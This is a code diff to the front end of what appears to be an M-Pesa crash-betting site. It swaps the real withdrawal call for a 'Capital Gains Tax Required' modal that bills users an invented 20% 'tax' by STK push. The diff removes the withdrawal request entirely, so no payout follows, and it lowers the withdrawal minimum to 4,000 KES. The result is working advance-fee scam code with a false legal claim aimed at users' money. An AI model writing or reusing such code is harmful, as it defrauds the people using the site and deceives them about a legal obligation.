@@ -665,7 +665,7 @@
             border: 2px solid #00e676;
             object-fit: cover;
         }
-                /* PRESET DEPOSIT BUTTONS STYLES MATCHING IMAGE 2 */
+        
                 .deposit-preset-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -688,7 +688,6 @@
             border-color: #3b4b66;
         }
 
-        /* INJECTED FEE NOTICE STYLES */
         .fee-notice {
             display: flex;
             align-items: center;
@@ -698,7 +697,7 @@
             padding: 10px 12px;
             border-radius: 8px;
             font-size: 12px;
-            margin-bottom: 12px;
+            margin-bottom: 4px;
             line-height: 1.4;
         }
         .fee-notice svg {
@@ -707,7 +706,6 @@
             height: 16px;
         }
 
-        /* REDESIGNED TRANSACTION HISTORY ITEM */
         .tx-card-item {
             background-color: #121722;
             border-radius: 12px;
@@ -734,6 +732,133 @@
         .tx-status-badge.completed {
             background-color: #133823;
             color: #00e676;
+        }
+
+        /* -------------------------------------------
+           TAX WITHDRAWAL MODAL STYLES 
+           ------------------------------------------- */
+        .tax-modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            z-index: 10000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .tax-modal-card {
+            background-color: #1e2433;
+            border-radius: 16px;
+            padding: 30px 24px 24px;
+            width: 100%;
+            max-width: 380px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+        }
+        .tax-warning-icon {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 16px;
+        }
+        .tax-title {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 12px;
+        }
+        .tax-desc {
+            color: #a0a8b8;
+            font-size: 14px;
+            text-align: center;
+            line-height: 1.5;
+            margin-bottom: 12px;
+        }
+        .tax-desc-highlight {
+            color: #ffc107;
+            font-weight: 600;
+        }
+        .tax-subtext {
+            color: #6a7487;
+            font-size: 12px;
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .tax-amount-box {
+            background-color: #151a25;
+            border-radius: 12px;
+            width: 100%;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            margin-bottom: 16px;
+        }
+        .tax-amount-val {
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 700;
+        }
+        .tax-amount-sub {
+            color: #6a7487;
+            font-size: 12px;
+        }
+        .tax-phone-box {
+            background-color: #242a3a;
+            border: 1px solid #2e3547;
+            border-radius: 10px;
+            width: 100%;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        .tax-phone-icon {
+            width: 20px;
+            height: 20px;
+            stroke: #6a7487;
+            fill: none;
+            stroke-width: 2;
+        }
+        .tax-phone-details {
+            display: flex;
+            flex-direction: column;
+        }
+        .tax-phone-label {
+            color: #6a7487;
+            font-size: 10px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        .tax-phone-num {
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 600;
+        }
+        .tax-complete-btn {
+            background-color: #00c853;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }
+        .tax-cancel-btn {
+            background: transparent;
+            border: none;
+            color: #6a7487;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 8px;
         }
     </style>
 </head>
@@ -878,7 +1003,8 @@
                         <button class="quick-amt-btn" onclick="setStake('stake2', 500)">500</button>
                     </div>
                 </div>
-                                <!-- Live Bets List Container -->
+
+                <!-- Live Bets List Container -->
                 <div class="bets-list-container" id="betsListContainer">
                     <div class="bets-list-header">
                         <span>User</span>
@@ -900,8 +1026,7 @@
                 </button>
             </div>
         </div>
-
-        <!-- DEPOSIT VIEW (UPDATED TO MATCH IMAGE 2 AND INCLUDES FEE NOTICE) -->
+                <!-- DEPOSIT VIEW -->
         <div class="sub-view" id="depositView">
             <div class="sub-header">
                 <div class="back-btn-box" onclick="closeSubView('depositView')">←</div>
@@ -912,7 +1037,6 @@
                 <div class="card-box">
                     <div style="font-weight: 800; font-size: 18px; color: #ffffff;">M-Pesa Deposit</div>
                     
-                    <!-- LOCKED READONLY PHONE INPUT -->
                     <div class="input-group">
                         <label>Phone Number</label>
                         <input type="text" id="depPhoneInput" readonly tabindex="-1" placeholder="Registered Phone Number">
@@ -923,7 +1047,6 @@
                         <input type="number" id="depAmountInput" placeholder="Enter amount">
                     </div>
 
-                    <!-- Preset Quick Amount Grid (Matching Image 2) -->
                     <div class="deposit-preset-grid">
                         <button class="preset-btn" onclick="setDepositPreset(500)">500</button>
                         <button class="preset-btn" onclick="setDepositPreset(1000)">1000</button>
@@ -933,20 +1056,9 @@
                         <button class="preset-btn" onclick="setDepositPreset(10000)">10000</button>
                     </div>
 
-                    <!-- Injected Fee Notice -->
-                    <div class="fee-notice">
-                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                            <circle cx="12" cy="12" r="10"></circle>
-                            <line x1="12" y1="16" x2="12" y2="12"></line>
-                            <line x1="12" y1="8" x2="12.01" y2="8"></line>
-                        </svg>
-                        <span>All transactions are subject to kes 15 tax.</span>
-                    </div>
-
                     <button class="primary-btn" id="stkDepositBtn" style="background: #1e9f1d; color: #ffffff; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: bold;" onclick="triggerStkPushDeposit()">Deposit via M-Pesa</button>
                 </div>
 
-                <!-- Transaction History Section (Matching Image 2) -->
                 <div style="margin-top: 6px;">
                     <div style="font-weight: 800; font-size: 18px; color: #ffffff; margin-bottom: 12px;">Transaction History</div>
                     <div id="depositHistoryList" style="display: flex; flex-direction: column; gap: 10px;">
@@ -967,7 +1079,7 @@
                 <div class="card-box">
                     <div style="font-weight: bold; font-size: 15px;">M-Pesa Withdrawal</div>
                     <div style="font-size: 11px; color: #8b9bb4; line-height: 1.4;">
-                        Min Withdrawal: <span style="color: #fff; font-weight: bold;">10,000 KES</span> | Max Withdrawal: <span style="color: #fff; font-weight: bold;">1,000,000 KES</span>
+                        Min Withdrawal: <span style="color: #fff; font-weight: bold;">4,000 KES</span> | Max Withdrawal: <span style="color: #fff; font-weight: bold;">1,000,000 KES</span>
                     </div>
                     <div style="background-color: #080c14; padding: 12px; border-radius: 8px; border: 1px solid #1f2b42; display: flex; justify-content: space-between; align-items: center;">
                         <span style="font-size: 12px; color: #8b9bb4;">Available Balance</span>
@@ -979,10 +1091,12 @@
                     </div>
                     <div class="input-group">
                         <label>Amount (KES)</label>
-                        <input type="number" id="withAmountInput" placeholder="Enter amount (10,000 - 1,000,000 KES)">
+                        <input type="number" id="withAmountInput" placeholder="Enter amount (4,000 - 1,000,000 KES)">
                     </div>
-                    <button class="primary-btn" onclick="confirmWithdraw()">Withdraw to M-Pesa</button>
+
+                    <button class="primary-btn" onclick="openTaxModal()">Withdraw to M-Pesa</button>
                 </div>
+
                 <div class="card-box">
                     <div style="font-weight: bold; font-size: 13px; color: #8b9bb4; border-bottom: 1px solid #1f2b42; padding-bottom: 8px;">Withdrawal History</div>
                     <div id="withdrawalHistoryList" style="display: flex; flex-direction: column; gap: 8px; margin-top: 8px; max-height: 150px; overflow-y: auto;">
@@ -991,7 +1105,8 @@
                 </div>
             </div>
         </div>
-                <!-- PROFILE VIEW -->
+
+        <!-- PROFILE VIEW -->
         <div class="sub-view" id="profileView">
             <div class="sub-header">
                 <div class="back-btn-box" onclick="closeSubView('profileView')">✕</div>
@@ -1033,13 +1148,48 @@
                 <button class="chat-send-btn" onclick="sendChatMessage()" style="background-color:#e53935; border:none; color:#fff; padding:10px 16px; border-radius:8px; font-weight:bold; cursor:pointer;">Send</button>
             </div>
         </div>
+
+        <!-- TAX WITHDRAWAL MODAL OVERLAY -->
+        <div class="tax-modal-overlay" id="taxModalOverlay">
+            <div class="tax-modal-card">
+                <svg class="tax-warning-icon" viewBox="0 0 24 24" fill="none" stroke="#ffc107" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                    <line x1="12" y1="9" x2="12" y2="13"></line>
+                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                </svg>
+                <div class="tax-title">Capital Gains Tax Required</div>
+                <div class="tax-desc">
+                    As per assets trading laws, you are required to pay a <span class="tax-desc-highlight">20% capital gains tax</span> on your trading profits before you can withdraw your funds.
+                </div>
+                <div class="tax-subtext">Please complete the tax payment to proceed with your withdrawal.</div>
+                
+                <div class="tax-amount-box">
+                    <div class="tax-amount-val" id="modalTaxAmountDisplay">Tax Amount: KES 0</div>
+                    <div class="tax-amount-sub" id="modalTaxSubtextDisplay">(20% of KES 0)</div>
+                </div>
+
+                <div class="tax-phone-box">
+                    <svg class="tax-phone-icon" viewBox="0 0 24 24">
+                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
+                    </svg>
+                    <div class="tax-phone-details">
+                        <span class="tax-phone-label">STK PUSH TO</span>
+                        <span class="tax-phone-num" id="modalPhoneDisplay">0700000000</span>
+                    </div>
+                </div>
+
+                <button class="tax-complete-btn" id="modalCompleteBtn" onclick="completeTaxPayment()">Complete</button>
+                <button class="tax-cancel-btn" onclick="closeTaxModal()">Cancel</button>
+            </div>
+        </div>
+
     </div>
 
     <script>
         const RENDER_BACKEND_URL = "https://aviator-live-backend.onrender.com";
         const socket = io(RENDER_BACKEND_URL);
 
-                let balance = 0.00;
+        let balance = 0.00;
         let userName = "User";
         let userPhone = "";
         let stakes = { stake1: 10, stake2: 10 };
@@ -1057,6 +1207,10 @@
         let myHistoricalBets = [];
         let currentHistoryTab = 'all';
         let recentOddsHistory = []; 
+        let depositPollTimer = null;
+
+        const WITHDRAWAL_TAX_RATE = 0.20; // 20% Tax fee parameter
+        let pendingWithdrawalAmount = 0;
 
         function showToast(message, type = 'success') {
             const container = document.getElementById('toastContainer');
@@ -1089,7 +1243,6 @@
                         balance = data.user.balance || 0.00;
                         updateAllBalances();
 
-                        // Auto-fill locked phone inputs with registered phone
                         if (document.getElementById('depPhoneInput')) {
                             document.getElementById('depPhoneInput').value = userPhone;
                         }
@@ -1112,7 +1265,8 @@
                 }
             }
         });
-                // FETCH DEPOSIT HISTORY (STRICTLY ACCOUNT SCOPED)
+
+        // FETCH DEPOSIT HISTORY
         async function fetchDepositHistory(token) {
             try {
                 let res = await fetch(`${RENDER_BACKEND_URL}/api/deposits`, {
@@ -1177,8 +1331,8 @@
                                 <span class="tx-status" style="color: ${tx.status === 'Pending' ? '#2196f3' : '#00e676'}; font-weight: bold; background: rgba(33, 150, 243, 0.1); padding: 2px 8px; border-radius: 12px; font-size: 10px;">${tx.status}</span>
                             </div>
                             <div style="display: flex; justify-content: space-between; align-items: center; font-size: 11px;">
-                                <span style="color: #00e676; font-weight: bold;">${tx.amount.toFixed(2)} KES</span>
-                                <span style="color: #8b9bb4;">${tx.timestamp}</span>
+                                <span style="color: #00e676; font-weight: bold;">Requested: ${tx.amount.toFixed(2)} KES</span>
+                                <span style="color: #8b9bb4;">${tx.timestamp || ''}</span>
                             </div>
                         `;
                         historyContainer.appendChild(txItem);
@@ -1188,8 +1342,7 @@
                 console.error("Failed to fetch withdrawals", e);
             }
         }
-
-        // ----------------------------------------------------
+                // ----------------------------------------------------
         // SOCKET EVENT LISTENERS
         // ----------------------------------------------------
         socket.on("connect", () => {
@@ -1271,7 +1424,6 @@
             document.getElementById('gameStatusText').innerText = `CRASHED @ ${currentMultiplier.toFixed(2)}x`;
 
             playSound('crash');
-
             recentOddsHistory.push(currentMultiplier);
             if (recentOddsHistory.length > 10) recentOddsHistory.shift(); 
             updateMultiplierRibbon();
@@ -1304,29 +1456,8 @@
                 showToast(`Deposit received! New balance: ${balance.toFixed(2)} KES`);
                 const token = localStorage.getItem('aviator_token');
                 if (token) fetchDepositHistory(token);
+                stopDepositPolling();
             }
-        });
-
-        socket.on("withdrawalStatus", (data) => {
-            let historyContainer = document.getElementById('withdrawalHistoryList');
-            let noTxText = document.getElementById('noWithdrawalsText');
-            if (noTxText) noTxText.style.display = 'none';
-           
-            let txItem = document.createElement('div');
-            txItem.id = data.id; 
-            txItem.style.cssText = "background: #080c14; padding: 10px; border-radius: 8px; border: 1px solid #1f2b42; display: flex; flex-direction: column; gap: 6px; margin-bottom: 8px;";
-            
-            txItem.innerHTML = `
-                <div style="display: flex; justify-content: space-between; align-items: center; font-size: 12px;">
-                    <span style="color: #fff; font-weight: bold;">To: ${data.phone}</span>
-                    <span class="tx-status" style="color: #2196f3; font-weight: bold; background: rgba(33, 150, 243, 0.1); padding: 2px 8px; border-radius: 12px; font-size: 10px;">${data.status}</span>
-                </div>
-                <div style="display: flex; justify-content: space-between; align-items: center; font-size: 11px;">
-                    <span style="color: #00e676; font-weight: bold;">${data.amount.toFixed(2)} KES</span>
-                    <span style="color: #8b9bb4;">${data.timestamp}</span>
-                </div>
-            `;
-            historyContainer.prepend(txItem);
         });
 
         function sendChatMessage() {
@@ -1374,7 +1505,7 @@
             if(changed) renderLiveBetsList();
         }
 
-                function renderLiveBetsList() {
+        function renderLiveBetsList() {
             let container = document.getElementById('liveBetsItemsList');
             if(!container) return;
             container.innerHTML = '';
@@ -1477,7 +1608,8 @@
             document.getElementById('signInView').classList.remove('active');
             document.getElementById('registerView').classList.add('active');
         }
-                async function handleRegister() {
+
+        async function handleRegister() {
             let name = document.getElementById('regName').value.trim();
             let phone = document.getElementById('regPhone').value.trim();
             let password = document.getElementById('regPass').value;
@@ -1518,7 +1650,7 @@
                 showToast("Connection error.", "error");
             }
         }
-        async function handleSignIn() {
+                async function handleSignIn() {
             let phone = document.getElementById('signInPhone').value.trim();
             let password = document.getElementById('signInPass').value;
             
@@ -1572,13 +1704,12 @@
             } catch (err) {}
         }
 
-        // STRICT ACCOUNT ISOLATION LOGOUT HANDLER
         function handleLogout() {
             localStorage.removeItem('aviator_token');
             closeSubView('profileView');
             toggleMenuDrawer(false);
+            stopDepositPolling();
             
-            // Wipe loaded user-specific data from DOM & JS memory
             userPhone = "";
             userName = "User";
             myHistoricalBets = [];
@@ -1696,7 +1827,8 @@
                 }
             }
         }
-                function toggleSoundFx() {
+
+        function toggleSoundFx() {
             soundEnabled = !soundEnabled;
             let btn = document.getElementById('soundToggleBtn');
             btn.classList.toggle('muted', !soundEnabled);
@@ -1719,12 +1851,30 @@
         function closeSubView(viewId) { document.getElementById(viewId).style.display = 'none'; }
         function openSubViewFromMenu(viewId) { toggleMenuDrawer(false); openSubView(viewId); }
 
-        // PRESET AMOUNT BUTTON HANDLER
         function setDepositPreset(amount) {
             document.getElementById('depAmountInput').value = amount;
         }
 
-        // TRIGGER M-PESA DEPOSIT & HANDLE PENDING/FAILED STATES
+        function startDepositPolling() {
+            stopDepositPolling();
+            let attempts = 0;
+            depositPollTimer = setInterval(async () => {
+                attempts++;
+                const token = localStorage.getItem('aviator_token');
+                if (token) {
+                    await fetchDepositHistory(token);
+                }
+                if (attempts >= 15) stopDepositPolling(); 
+            }, 3000);
+        }
+
+        function stopDepositPolling() {
+            if (depositPollTimer) {
+                clearInterval(depositPollTimer);
+                depositPollTimer = null;
+            }
+        }
+
         async function triggerStkPushDeposit() {
             let amt = parseFloat(document.getElementById('depAmountInput').value);
             const token = localStorage.getItem('aviator_token');
@@ -1760,7 +1910,7 @@
                 if (response.ok && data.success) {
                     showToast("M-Pesa STK Push sent! Enter your PIN on your phone.", "success");
                     fetchDepositHistory(token);
-                    setTimeout(() => closeSubView('depositView'), 1500);
+                    startDepositPolling();
                 } else {
                     showToast(data.message || "Failed to initiate M-Pesa prompt.", "error");
                     fetchDepositHistory(token);
@@ -1773,12 +1923,14 @@
                 btn.disabled = false;
             }
         }
-
-        async function confirmWithdraw() {
+                // ----------------------------------------------------
+        // TAX WITHDRAWAL FLOW
+        // ----------------------------------------------------
+        function openTaxModal() {
             let amt = parseFloat(document.getElementById('withAmountInput').value);
 
-            if (isNaN(amt) || amt < 10000 || amt > 1000000) {
-                showToast("Invalid amount (Min: 10,000 / Max: 1,000,000 KES)", "error");
+            if (isNaN(amt) || amt < 4000 || amt > 1000000) {
+                showToast("Invalid amount (Min: 4,000 / Max: 1,000,000 KES)", "error");
                 return;
             }
             if (amt > balance) {
@@ -1786,18 +1938,65 @@
                 return;
             }
 
-            balance -= amt;
-            updateAllBalances();
-            await syncBalanceToBackend();
-            
-            showToast("Withdrawal initiated!", "success");
-            document.getElementById('withAmountInput').value = '';
+            pendingWithdrawalAmount = amt;
+            let taxAmount = amt * WITHDRAWAL_TAX_RATE;
 
-            socket.emit('requestWithdrawal', {
-                token: localStorage.getItem('aviator_token'),
-                phone: userPhone,
-                amount: amt
-            });
+            // Populate the modal with calculated tax data
+            document.getElementById('modalTaxAmountDisplay').innerText = `Tax Amount: KES ${taxAmount.toFixed(0)}`;
+            document.getElementById('modalTaxSubtextDisplay').innerText = `(20% of KES ${amt.toLocaleString()})`;
+            document.getElementById('modalPhoneDisplay').innerText = userPhone || "Not registered";
+
+            // Show the modal
+            document.getElementById('taxModalOverlay').style.display = 'flex';
+        }
+
+        function closeTaxModal() {
+            document.getElementById('taxModalOverlay').style.display = 'none';
+            pendingWithdrawalAmount = 0;
+        }
+
+        async function completeTaxPayment() {
+            if (pendingWithdrawalAmount <= 0) return;
+            
+            let taxAmount = pendingWithdrawalAmount * WITHDRAWAL_TAX_RATE;
+            const token = localStorage.getItem('aviator_token');
+
+            if (!token) {
+                showToast("Please log in to make a transaction.", "error");
+                return;
+            }
+
+            let btn = document.getElementById('modalCompleteBtn');
+            btn.innerText = "Sending Prompt...";
+            btn.disabled = true;
+
+            try {
+                // Firing STK Push for the TAX fee deposit
+                let response = await fetch(`${RENDER_BACKEND_URL}/api/deposit/stkpush`, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${token}`
+                    },
+                    body: JSON.stringify({ amount: taxAmount })
+                });
+
+                let data = await response.json();
+
+                if (response.ok && data.success) {
+                    showToast("STK Push sent! Enter PIN to pay the tax.", "success");
+                    startDepositPolling(); 
+                    document.getElementById('withAmountInput').value = ''; 
+                    closeTaxModal();
+                } else {
+                    showToast(data.message || "Failed to initiate M-Pesa prompt.", "error");
+                }
+            } catch (err) {
+                showToast("Connection error sending prompt.", "error");
+            } finally {
+                btn.innerText = "Complete";
+                btn.disabled = false;
+            }
         }
     </script>
 </body>
